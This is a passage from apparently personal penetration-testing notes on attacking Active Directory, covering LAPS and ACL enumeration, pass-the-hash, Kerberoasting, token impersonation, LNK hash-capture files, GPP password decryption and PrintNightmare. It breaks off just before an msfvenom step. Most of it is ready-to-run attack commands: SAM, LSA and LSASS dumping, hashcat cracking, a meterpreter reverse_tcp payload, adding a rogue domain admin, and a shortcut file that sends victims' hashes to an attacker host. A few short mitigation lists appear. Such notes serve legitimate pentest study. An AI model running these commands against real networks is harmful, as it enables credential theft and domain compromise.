```
**<u>AppLocker</u>**

AppLocker is Microsoft's application whitelist software, and it gives system administrators control over which applications and files users can run. It provides granular control over executables, scripts, WIndows installer files, DLLs, packaged apps, and packed app installers. It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed. Organizations also often focus on blocking the PowerShell.exe executable, but forget about the other PowerShell executable locations like `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`. These can sometimes be called from different locations, but sometimes, there are more stringent AppLocker policies that require more creativity to bypass:
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

```
**<u>PowerShell Constrained Language Mode</u>**

This mode locks down many of the features needed to use PowerShell effectively, like blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell class, and more. Whether in Full Language Mode or Constrained Language Mode, either can be quickly enumerated as follows:
```powershell
$ExecutionContext.SessionState.LanguageMode     #will output which mode is used

```
**<u>LAPS</u>**

**Local Administrator Password Solution (LAPS)** is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. DOmain users who can read the LAPS password set for machines with LAPS installed can be enumerated with the LAPSToolKit. One function is parsing ExtendedRights for all computers with LAPS enabled, which will show groups specifically delegated to read LAPS passwords, which are often users in protected groups. An account that has joined a computer to a domain receives All Extended Rights over that host, which gives the account tha ability to read passwords. 

Enumeration can show a user account that can read the LAPS password on a host, yielding a list of AD users that can read LAPS passwords:
```powershell
Find-LAPSDelegatedGroups

```
The **Find-AdmPwdExtendedRights** checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with these rights can read LAPS passwords and may be less protected with users in delegated grouos:
```powershell
Find-AdmPwdExtendedRights

```
Finally, the **Get-LAPSComputers** function can be used to searh for computers that have LAPS enabled when passwords expire; it also contains passwords in cleartext if the attacker has access:
```powershell
Get-LAPSComputers
```

<a id="activedircredenumlinux"></a>

#### **`Credentialed Enumeration (Linux)`**

Once gaining a foothold in the domain, try to dig deeper with the low privilege domain user credentials. At this point, there should be a general idea about the domain's userbase and machines, so now enumerate the domain in depth. The domain user, computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, etc. are of interest now. Most of the following tools will not work without valid domain user credentials at any permission level. So at a minimum, a user's cleartext password, NTLM password hash, or SYSTEM access on a domain-joined host is needed beyond this point. 

> Save all of the output to files to easily access it again later for reporting or use with other tools

**<u>CrackMapExec</u>**

First, use the SMB protocol to enumerate users and groups. The previously discovered domain controller should be targeted with the following command, as it holds all data in the domain database that is of interest. The credentials for the user should also be used to retrieve a **list of all domain users;** this will provide the user information, including data points like the badPwdCount attribute, which an be helpful when performing actions like targeted password spraying:
```bash
sudo crackmapexec smb x.x.x.x -u username -p password --users

```
It is also possible to obtain a **complete listing of domain groups** with the following command. This will list groups within the domain and the number of users in each. The output also shows the built-in groups on the domain controller. Take note of key groups like Administrators, domain admins, executives, any groups that may contain privileged IT admins, etc. These groups will likely contain users with elevated privileges worth targeting:
```bash
sudo crackmapexec smb x.x.x.x -u username -p password --groups

```
Now, target other hosts by seeing **what users are logged in** currently with the following command.A local admin may be used as a jump host or similar by administrative users. BloodHound can be used to hunt for user sessions as well, as it is used to view Domain User sessions graphically and quickly in many ways:
```bash
sudo crackmapexec smb x.x.x.x -u username -p password --loggedon-users

```
The `--shares` flag can be used to **enumerate available shares on the remote host** and the level of access of the compromised user account has to each share (READ or WRITE access): 
```bash
sudo crackmapexec smb x.x.x.x -u username -p password --shares

```
Each directory can be spidered once digging into the shares. The module `spider_plus` will dig through each readable share on the host, list all readable files, and provide the results to a JSON file in `/tmp/cme_spider_plus`:
```bash
sudo crackmapexec smb x.x.x.x -u username -p password -M spider_plus --share 'Specific Share'

```
**<u>SMBMap</u>**

Again, SMBMap is generally used for enumerating SMB shares from a Linux host. It can be used to gather a listing of shares, permissions, and share contents if accessible. once access is obtained, it can be used to download and upload files and execute remote commands. Like CrackMapExec, SMBMap and a set of domain user credentials can be used to check for accessible shares on remote systems. #### **`ACL Enumeration`**

> Some ACL attacks can be considered destructive, such as changing a user's password or performing other modifications within a client's AD domain. ACL abuse can be both a post-compromise and a post-domain compromise technique, depending on the context. **ACL abuse TTPs are listed in the Post-Compromise Attack section, however.** While `DCSync` can be a result of ACL abuse, it is not inherently ACL abuse, so it is listed in the Post-Domain Compromise attack section

For security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through ACLs. Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it. Settings within an ACL are known as **`Access Control Entries (ACEs)`;** each ACE maps back to a user, group, or process (security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. When ACLs are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list. There are two types of ACLs in AD:

* **`Discretionary ACL (DACL)`:** Defines which processes are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. Each item under **Permission entries** makes up the DACL for the user account, while the **individual entries** (under access) are ACE entries with rights granted over the user oject to various users and groups. 
   * If a DACL does not exist for an object, allo who attempt to access the object are granted full rights
   * If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it. 

* **`System ACL (SACL)`:** Allows administrators to log access attempts made to secured objects. These can be seen through the SACLs through the Auditing tab 

There are three main types of ACEs that can be aplied to all securable objects in AD:
* **Access denied ACE:** Used within a DACL to show that a user or group is explicitly denied access to an object
* **Access allowed ACE:** Used within a DACL to show that a user or group is explicitly granted access to an object
* **System Audit ACE:** Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not, and what type of access occurred. 

Each ACE is made up of the following four components, all of which can be seen graphically in Active Directory Users and Computers (ADUC):
* The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
* A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
* A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object
* An access mask which is a 32-bit value that defines the rights granted to an object

Attackers use ACE entries to either further access or establish persistence; many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. The following are some examples of AD object security permissions:

* **`ForceChangePassword`:** Abused with **Set-DomainUserPassword.** 
   * Gives the attacker the right to reset a user's password without first knowing their password

* **`Add Members`:** Abused with **Add-DomainGroupMember.**

* **`GenericAll`:** Abused with **Set-DomainUserPassword** or **Add-DomainGroupMember.**
   * Grants the attacker full control over a target object. Depending on if this is granted over a user or group, group membership can be modified, a password can be force changed, or a targeted Kerberoasting attack can be conducted
   * If an attacker has this access over a computer object and the LAPS is in use in the environment, the LAPS password can be read and local admin access can be gained to the machine. THis can help to achieve lateral movement or privilege escalation in the domain if privileged controls are obtained or some sort of privileged access is gained

* **`GenericWrite`:** Abused with **Set-DomainObject.** Gives the attacker the right to write any non-protected attribute on an object. 
   * If an attacker has this access over a user, they could assign them an SPN and perform a Kerberoasting attack. 
   * If the attacker has this access over a group, they could add themselves or another security principal to a given group. 
   * If the attacker has this access over a computer object, they could perform a resource-based constrained delegration attack

* **`WriteOwner`:** Abused with **Set-DomainObjectOwner**

* **`WriteDACL`:** Abused with **Add-DomainObjectACL**

* **`AllExtendedRights`:** Abused with **Set-DomainUserPassword** or **Add-DomainGroupMember.**

* **`Addself`:** Abused with **Add-DomainGroupMember**
   * Shows security groups that a user can add themselves to


Possible ACL attacks can be enumerated with BloodHound, PowerView, or built-in AD management tools. Group membership management, excessive user rights, and abusing forgot password permissions are common attack scenarios.

**<u>PowerView</u>**

Digging through all the PowerView results will be extremely time-consuming and likely inaccurate. To use this tool more effectively, **perform targeted enumerating starting with an accessible user** to see if the user has any exploitable ACL rights. First, the SID of the target user is needed to search effectively:
```powershell
Import-Module .\PowerView.ps1

$sid = Convert-NameToSid username      #this can also be done with group names

```
Once this is done, the `Get-DomainObjectACL` function can be used to perform the targeted search. This function is used to find all domain objects that the user has rights over by mapping the user's SID using the `$sid` variable to the `SecurityIdentifier` property, which outputs who has the given right over an object. This command will take a while to run, especially in a large environment. If the first command is run, the GUID of the ObjectAceType must be resolved, but if the second command is run, the GUID of the ObjectAceType will be resolved in the output:
```powershell
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}    #resolve GUID

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}  #GUID resolved in output
```
The GUID of ObjectAceType can be googled to see what right the user has. Or, a reverse search using PowerShell can be done to map thr right name back to the GUID value:
```powershell
$guid= "00299570-246d-11d0-a768-00aa006e0529"

Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

```
**<u>Manual Enumeration</u>**

If the `Get-Acl` and `Get-ADUser` cmdlets are available on the client system and PowerView cannot be imported, the same ACL enumeration can be done. This, however, is not very efficient because it will take much longer than the equivalent command using PowerView. 

First, make a list of all domain users with the following command:
```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

```
Then, each line of the file can be read using a foreach loop, and the `Get-Acl` cmdlet can be used to retrieve ACL information for each domain user by feeding each line of the ad_users.txt file to the `Get-ADUser` cmdlet. After, the Access property is selected, yielding information about access rights. Finally, the `IdentityReference` property is set to the accessible user:
```powershell
foreach($line in [System.IO.File]::ReadLines("C:\path\to\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'DOMAINCONROLLER\\username'}}

```
Once the data is obtained, the same methods from the PowerView portion can be used to convert the GUID to a human-readable format to understand what rights the target user has. 

Again, nested group membership means that users in group B will inherit all rights of any group that group B is nested into (a member of). #### **`Pass Attacks`**

If a password is cracked, or if the SAM hashes are dumped, either can be leveraged for lateral movement in networks. `crackmapexec` is the primary tool used to pass around credentials in a network. This requires a known password and a valid account that is pushed around to every device that has the ability to accept the log in via SMB. Output in green represents machines with valid authentication, where the user is not a local administrator. Depending on the scope of the penetration test, a single IP address can be specified instead of an entire subnet:
```bash
crackmapexec smb x.x.x.x/CIDR -u username -d DOMAIN.CONTROLLER -p password

```
This attack can also be done with hashes through msfconsole. By using `exploit/windows/smb/psexec`, the attacker can input hashdump to dump all of the SAM hashes. Similarly, `impacket-secretsdump` enables the user to grab local hashes once they obtain valid credentials:
```bash
impacket-secretsdump DOMAIN.CONTROLLER/username:password@x.x.x.x

```
Once a hash is obtained, a **Pass the Hash Attack** can be conducted via crackmapexec. Instead of using a password, the entire hash (NTLM) must be passed as an argument; this attack only works with **NTLMv1** This will show what machines the specified user can log in to:
```bash
crackmapexec smb x.x.x.x/CIDR -u username -H <NTLM hash> --local-auth

```
Instead of using impacket-secretsdump, Crackmapexec can also be used to dump the SAM directly. If there is a successful log in, the SAM hash will be dumped for each username on the machine. Again, the entire hash (NTLM) must be passed as an argument:
```bash
crackmapexec smb x.x.x.x/CIDR -u username -H <NTLM hash> --local-auth --sam

```
Shares can also be enumerated on the different devices. This is particularly useful because it may disclose shares that were not previously seen:
```bash
crackmapexec smb x.x.x.x/CIDR -u username -H <NTLM hash> --local-auth --shares

```
The local security authority can also be dumped, also dumping valuable information that may otherwise be overlooked:
```bash
crackmapexec smb x.x.x.x/CIDR -u username -H <NTLM hash> --local-auth --lsa 

```
Crackmapexec has different modules that can be loaded. To see which modules are available, run the first command. If the lsassy module were to be used, the LSASS can be dumped, which is responsible for enforcing the security policy on the system and storing credentials. This information that may not be visible when using other commands, so it should be used when conducting a penetration test:
```bash
crackmapexec smb -L 

crackmapexec smb x.x.x.x/CIDR -u username -H <NTLM hash> --local-auth -M lsassy

```
Finally, crackmapexec has a database that stores all of the important information captured from crackmapexec. To enter the database, type the following
```bash
cmed

```

* **Privilege Account Management (PAM):** This limits pass attacks as hash/password is strong and constantly rotated
   * Check out/in sensitive accounts when needed
   * Automatically rotate passwords on check out and check in

#### **`Kerberoasting`**

> A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or an NTLM hash), a shell in the context of a domain user, or account such as system. It is also necessary to know which host in the domain is a domain controller so that it can be queried **Cross-Forest Kerberoasting** is mentioned in the *Attacking Domain Trusts* section

Kerberoasting is a lateral movement/privilege escalation technique in AD environments. This attack targets **Service Principal Names (SPN) accounts,** which are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. ANy domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. 

Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested memberships. Kerberoasting essentially takes advantage of these service accounts by requesting a **Ticket Granting Service (TGS)** ticket from the **Key Distribution Center (KDC)** for a specific service, and decrypts the ticket to obtain the service's account password. The process looks as follows:

**`1. User Requests a Ticket Granting Ticket (TGT)`:** The user sends this request to the KDC, which is typically hosted on the domain controller. This request includes the user's username and timestamp, encrypted with the user's password hash. 
   * Any user within the domain can request a TGT to the domain controller, so if an account is compromised, an attacker can send one too

**`2. KDC Issues the TGT`:** If the username and password hash provided by the user are valid, the KDC sends back a TGT. The TGT is encrypted with the KDC's secret key. 

**`3. User Requests a Service Ticket (TGS)`:** Once the user receives the TGT, they request a TGS ticket from the domain controller. In order to request the TGS, the user must present the TGT to the domain controller as proof of their identity. This request also specifies the service the user wants to access

**`4. KDC Issues the TGS`:** If the TGT is valid, the KDc sends back a TGS ticket to the user. 
   * The TGS is encrypted with the serverice account's account hash, and contains a session key that the user and the service can use to communicate securely.
   * Attackers often target this step, as they can attempt to decrypt the TGS ticket to gain access to the application server's account hash. 
      * Attackers can use `Hashcat` or `John` to get the service account's password hash, which can be used for lateral movement or privilege escalation
   * Obtaining a TGS ticket via Kerberoasting does not guarantee a set of valid credentials. Kerberoasting and the presence of SPNs do not guarantee any level of access.
      * TGS tickets take longer to crack than other formats such as NTLM hashes, so unless a weak password is set or the wordlist contains the exact password, it can be difficult or impossible to obtain the cleartext using a standard cracking tool. 

**`5. User Presents the TGS Ticket to the Application Server`:** The user sends the TGS to the application server they want to access. The TGS serves as proof that the user has been authenticated by the KDC and is authorized to access the server

**`6. Application Server Validates the TGS`:** The application server decrypts the TGS by using the service account's password hash to verify the user's identity and permissions. 
   * If the TGS is valid, the application server allow the user to authenticate
   * If the TGS is invalid or the user lacks permissions, access is denied. 

Service accounts are often configured with weak or reused passwords to simplify administration, and sometimes, the password is the same as the username. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, it can be used to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, the MSSQL service can be accessed as sysadmin, xp_cmdshell extended procedure can be enabled, and arbitrary code execution can be gained on the target SQL server. 

Depending on the position in the network, this attack can be performed in multiple ways:
* From a non-domain joined Linux host using valid domain user credentials
* From a non-domain joined Windows host using runas /netonly
* From a domain-joined Linux host as root after retrieving the keytab file
* From a domain-joined Windows host authenticated as a domain user
* From a domain-joined Windows host with a shell in the context of a domain account
* As SYSTEM on a domain-joined Windows host

<br>

**<u>Mitigation Techniques</u>**

* **Strong Passwords**
   * Ensure that service account passwords/passphrases are long and complex enough

* **Principle of Least Privilege**
   * Service accounts should not be running as domain administrators
   * Service account passwords should not be put in the description of the AD account
   * Domain Admins and other highly privileged accounts should not be used as SPN accounts (if SPN accounts must exist in the environment)

* **Use Managed Service Accounts (MSA) and Group Managed Service Accounts (gMSA)**
   * These accounts use very complex passwords, and automatically rotate on a set interval (like machine accounts)
   * If not possible, set up accounts with LAPS

* **Look at Logs**
   * Kerberoasting requests TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, there will be an abnormal number of `TGS-REQ` and `TGS-REP` requests and responses, signaling the use of automated Kerberoasting tools.
   * Domain controllers can be configured to log Kerberos TGS ticket requests by seleting Audit Kerberos Service Ticket Operations within Group Policy. This will generate two separate event IDs:
      * **4769:** A Kerberos service ticket was requested. 10-20 TGS requests for a given account can be considered normal in a given environment, but a large amount of 4769 event IDs from one account within a short period of time may indicate an attack
      * **4770:** A Kerberos service ticket was renewed

* **Restrict Using the RC4 Algorithm**
   * This should especially be done for Kerberos requests by service accounts. This must be tested to make sure nothing breaks within the environment

##### **`Kerberoasting (From Linux)`**

Start by gathering a listing of SPNs in the domain. To do this, **a valid set of domain credentials and the IP address of a domain controller (often the KDC) are needed.** It is possible to authenticate to the domain controller with a cleartext password, NT password hash, a Kerberos ticket; this demonstration uses a password. The following command generates a credential prompt, followed by a listing of all SPN accounts with the group membership. First target the Domain Admins group (or any other administrative group), as cracking one of these tickets could lead to domain compromise; however, investigating the group membership of all accounts is worth it because there may be an account with an easy-to-crack ticket that can help move laterally/vertically in the target domain:
```bash
impacket-GetUserSPNs -dc-ip x.x.x.x DOMAIN.CONTROLLER/username:password 

```
Once this is done, all the TGS tickets can be pulled for offline processing using the `-request` flag. The TGS tickets will be output as a long hash that can potentially be cracked via Hashcat or John. The first command can output the hash of all SPN accounts, the second command can be used to request the TGS ticket for a specific SPN account, and the third command can be used facilitate offline cracking to automatically write the TGS ticket to a file:
```bash
impacket-GetUserSPNs DOMAIN.CONTROLLER/username:password -dc-ip x.x.x.x -request    #all SPN accounts

impacket-GetUserSPNs DOMAIN.CONTROLLER/username:password -dc-ip x.x.x.x -request-user user_account    #specific SPN account

impacket-GetUserSPNs DOMAIN.CONTROLLER/username:password -dc-ip x.x.x.x -request-user user_account -outputfile user_account_tgs  #specific to file

```
Look through the output from the previous command(s). Consider the LastLogon date; if it has never been logged onto, it may be a honeypot. Regardless, once the hashes are obtained, the user's password can be cracked offline using Hashcat. If the hash is not already in a text file, put it in one, find the hashcat module associated with Kerberos, and crack it:
```bash
hashcat --help | grep kerberos

hashcat -m 13100 kerberoast.txt <wordlist>

```
As the last step, confirm account access and privileges. If there are domain admin rights, the attacker can authenticate to the target domain controller. From here, it is possible to perform post-exploitation and continue to enumerate the domain for other paths to compromise:
```bash
sudo crackmapexec smb x.x.x.x -u user -p password
```

##### **`Kerberoasting (From Windows)`**

**<u>Manual Methods</u>**

The `setspn` binary is a built-in tool in Windows (CMD) that can be used to enumerate SPNs in the domain. This tool will return different SPNs for the various hosts in the domain. Focus on user accounts and ignore the computer accounts:
```powershell
setspn.exe -Q */*   #from CMD.exe

```
Next, using PowerShell, request TGS tickets for a returned account from the previous output and load them into memory. Once they are loaded into memory, extract them using mimikatz. The following command targets a single user:
```powershell
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "AccountName/SPN-SPN-SPN.domain.controller:number"

```
In this case, the `Add-Type` cmdlet is used to add a .NET framework class to the PowerShell session, which can then be instantiated like any .NET framework object. The `-AssemblyName` parameter allows the attacker to specify an assembly that contains types that are of interest. `System.IdentityModel` is a namespace that contains different classes for building security token service, and the `New-Object` cmdlet is used to create an instance of a .NET framework object. The `System.IdentityModel.Tokens` namespace is then used with the `KerberosRequestorSecurityToken` class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in the current logon session. It is also possible to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal. 

Instead of just running the previous command, the setspn binary can be used in tandem to request tickets for all accounts with SPNs set. 
```powershell
setspn.exe -T domain.controller -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

```
Now that the tickets are loaded, Mimikatz can be used to extract the ticket(s) from memory (from CMD):
```powershell
base64 /out:true   #Depends on the network position

kerberos::list /export

```
**If the base64 output is not specified in Mimikatz, the `mimikatz # kerberos::list /export` command will write the .kirbi file(s) to disk.** In this case, download the file(s) and run [kirbi2john.py](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) against them directly, skipping the base64 decoding step. 

**If the `base64 /out:true` command is not specified, Mimikatz will extract the tickets and write them to .kirbi files.** Depending on the position on the network and if it possible to move files to the attacking machine, this can be easier in regards to ticket cracking. Anyways, take the base64 blob and prepare it for cracking by removing new lines and white spaces (since the column would be wrapped). This can be done on an online tool or from a Linux machine:
```bash
echo "<base64 blob>" |  tr -d \\n 

```
Place the single line of output into a file and convert it back to a `.kirbi` file using the base64 utility. Once this is done, use [kirbi2john.py](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) to extract the Kerberos ticket from the TGS file:
```bash
cat encoded_file | base64 -d > file.kirbi

python2.7 kirbi2john.py file.kirbi

```
This will create a file called `crack_file`, which must be modified to be able to use Hashcat against the hash. Once modified, read the file to confirm that it can be fed to Hashcat. If it is in a crackable format, run it through hashcat with a strong wordlist:
```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > hashcat_file

hashcat -m 13100 hashcat_file /path/to/wordlist

```
**<u>Automated Methods</u>**

Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat and John than other encryption algorithms such as AES. When performing Kerberoasting in most environments, RC4 (type 23) hashes will begin with `$krb5tgs$23$`. Other times, AES-256 (type 18) encrypted hashes will begin with `$krb5tgs$18$`. While it is possible to crack AES-128 (type 17) and AES-256 TGS tickets using Hashcat, it will typically be more time consuming than cracking RC4 encrypted tickets, but it will still be possible especially if a weak password is chosen. **RC4 hashes use module 13100, while AES hashes use module 19700.**

It is possible, however, to edit the encryption types used by Kerberos. This can be done by opening **Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos.** Removing all other encryption types except for RC4_HMAC_MD5 would enable encryption downgrading. Removing support for AES would introduce a security flaw into AD and should likely never be done. Removing support for RC4, regardless of the domain controller Windows server version or domain functional level, could have operational impacts and should be tested before implementation. 

[PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) can be used to extract the TGS tickets and convert them to Hashcat format. First, enumerate SPN accounts:
```powershell
Import-Module .\PowerView.ps1

Get-DomainUser * -spn | select samaccountname

```
Based on the output, target specific users and retrieve the TGS ticket in Hashcat format (1st command). Once the hash is retrieved, export all tickets to a CSV file for offline processing (2nd command):
```powershell
Get-DomainUser -Identity username | Get-DomainSPNTicket -Format Hashcat

Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\domaincontroller_tgs.csv -NoTypeInformation

cat .\domaincontroller_tgs.csv     #view CSV file

```
To check the encryption time of a user's request ticket, the following command can be run to get msDS-SupportedEncryptionTypes attribute. If the attribute is set to 0, the encryption type is RC4 (RC4_HMAC_MD5). If the attribute is set to 24, the encryption type is AES 128/256 (AES256-CTS-HMAC-SHA1-96):
```powershell
Get-DomainUser username -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

```
[Rubeus](https://github.com/GhostPack/Rubeus) can also be used to perform Kerberoasting even faster and easier. This tool has many options for interacting with Kerberos, including:
* Performing Kerberoasting and outputting hashes to a file
* Using alternate credentials
* Performing Kerberoasting combined with a pass-the-ticket attack
* Performing "opsec" Kerberoasting to filter out AES-enabled accounts
* Requesting tickets for accounts passwords set between a specific date range
* Placing a limit on the number of tickets requested
* Performing AES Kerberoasting

First, gather stats with Rubeus. The following command will show Kerberoastable users and their encryption method for ticket supports:
```powershell
.\Rubeus.exe kerberoast /stats

```
Now, use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth focusing on for offline cracking with Hashcat. The `/nowrap` flag should be specified so that the hash can be easily copied down for cracking by preventing any base64 ticket blobs from being column wrapped. 
```powershell
\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

```
The `/tgtdeleg` flag can be used to specify RC4 encryption when requesting a new service ticket. The tool does thus by specifying RC4 encryption as the only supported algorithm in the body of the TGS request, even if the supported encryption types are listed as AES 128/256. However, this will not work against Windows Server 2019 domain controller, regardless of the domain functional level. As mentioned, RC4 encrypted tickets can be cracked much faster than AES encrypted tickets:
```powershell
.\Rubeus.exe kerberoast /tgtdeleg /user:username /nowrap

```
If either PowerView or Rubeus are used, copy the hash to a file and crack it via Hashcat. Use the corresponding module depending on the hash type:
```bash
hashcat -m <13100 or 19700> hash_from_rubeus /path/to/wordlist
```

<a id="activedirtokenimpersonation"></a>

#### **`Token Impersonation`**

Tokens are temporary keys that allow a user to access a system/network without having to provide credentials each time they access a file; they are essentially cookies for computers. There are two types of tokens:
1. **Delegation:** Created for logging into a machine or RDP
2. **Impersonation:** "Non-interactive" such as attaching a network drive or a domain logon script

There are many tools available to conduct token impersonation attacks, but metasploit may be the simplest from a remote (attacking) machine. If an attacker is unable to get a metasploit shell, Mimikatz can be used in lieu. Through delegate tokens specifically, a user's login can be impersonated. Once a shell is obtained through metasploit, the `incognito` module can be loaded:
```bash
msf6 > use exploit/windows/smb/psexec     #set corresponding options

set payload windows/x64/meterpreter/reverse_tcp

meterpreter > load incognito

meterpreter > list_tokens -u

meterpreter > impersonate_token domain\\username

```
The second-to-last comamand will show the available user tokens to impersonate, which can be used in the last command. The double backslashes are necessary for character escaping. Always try to compromise a domain admin's delegate token, as higher-privilege attacks can be performed. It would be a good idea to create a new domain admin then run a secretsdump on the domain controller, as follows:
```powershell
net user /add username password /domain

net group "Domain Admins" username /ADD /DOMAIN

```
**<u>Mitigation Techniques</u>**
* **Limit User/Group Token Creation Permission**

* **Account Tiering:** This is best practice and should be implemented regardless

* **Local Admin Restriction:** This is best practice and should be implemented regardless

<a id="activedirlnkfileattacks"></a>

#### **`LNK File Attacks`**

LNK File Attacks are considered a type of watering hole, as it requires placing a malicious file in a shared folder. This attack can be replicated by creating a malicious file directly on the AD server, and placing it in a file share. The malicious LNK file needs to be created from an **elevated PowerShell shell,** as follows:
```powershell
$objShell = New-Object -ComObject WScript.shell          
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\x.x.x.x\@test.png"         #attacking machine IP address
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()

```
Once the malicious file is created, prepend it with `~` or `@`, so it is one of the first shown files then put it in one of the file shares. If Responder is running from the attacking machine and the malicious file is executed, the user's hash that executed the file will be sent over to the attacker:
```bash
sudo responder -I <interface> -dPv

```
This same attack can be replicated via `crackmapexec` or `netexec` with the slinky module. This would still require an end user to execute the malicious file, however:
```bash
crackmapexec smb {AD IP} -d domain.controller -u username -p password -M slinky -o NAME=test SERVER={Attacking IP}
```

<a id="activedirgppcpassattacks"></a>

#### **`GPP/cPassword Attacks`**

When a new Group Policy Preferences (GPP) is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applied to. These files can include those used to:
* Map drives (drives.xml)
* Create local users
* Create printer config files (printers.xml)
* Group Policy Preferences (GPP) Passwords
* Creating and updating services (services.xml)
* Creating scheduled tasks (scheduledtasks.xml)
* Changing local admin passwords.

These files contain an array of configuration data and defined passwords. GPP allows admins to create policies using embedded credentials; these credentials are encrypted and placed in a "cPassword." The encryption key (AES) was accidentally released, allowing attackers to decrypt the cPasswords. Any domain user can read these files, as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share. This was patched in MS14-025; however, it does not prevent previous uses, so if the domain controller is not patched or if previous uses are present on the machine, then the machine may be vulnerable to this attack. 

There are many ways to determine whether the policy share is vulnerable, such as **manually browsing the SYSVOL share (Groups.xml & Registry.xml), using [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the GPP Metasploit Post Module (requires user credentials), or by using either of the two modules in CrackMapExec** for locating and retrieving GPP passwords:
```bash
msf6 > search auxiliary smb_enum_gpp

crackmapexec smb x.x.x. -u username -p password -M gpp_autologin

crackmapexec smb x.x.x. -u username -p password -M gpp_password 
```

Using CrackMapExec's modules will automatically decrypt the password and output the cleartext password of found users. From manual inspection, vulnerable usernames will be disclosed in the value of the `name=` parameter, and the cpassword will be disclosed in the value of the `cpassword=` parameter. Copy the cpassword value and decrypt it as follows:
```bash
gpp-decrypt <cpassword value>

```
**<u>Mitigation Techniques</u>**
* **Patch the Machine**
   * This vulnerability was patched in KB2962486

* **Delete Certain Files**
   * Delete old GPP xml files stored in the SYSVOL

<a id="activedirPrintNightmare"></a>

#### **`PrintNightmare`**

This attack only requires the authentication of a user account. Printer spoolers allow users to add printers, which runs with system privileges so any type of authenticated attacker, remote or local, can run code execution with the system privileges. This attack is also known as [CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675); there are several [attacks](https://github.com/calebstewart/CVE-2021-1675) that can be found online.


First, see if the AD server is vulnerable to this attack. If it is vulnerable, the following command will output 'Print System Asyncrhonous Remote Protocol' and 'Print System Remote Protocol'
```bash
impacket-rpcdump @x.x.x.x | egrep 'MS-RPRN|MS-PAR'

```
Before running this exploit, make sure `impacket` is new enough. Regardless, once the AD server is identified as vulnerable, a malicious dll file needs to be created via msfvenom and hosted on the attacking machine:
```bash
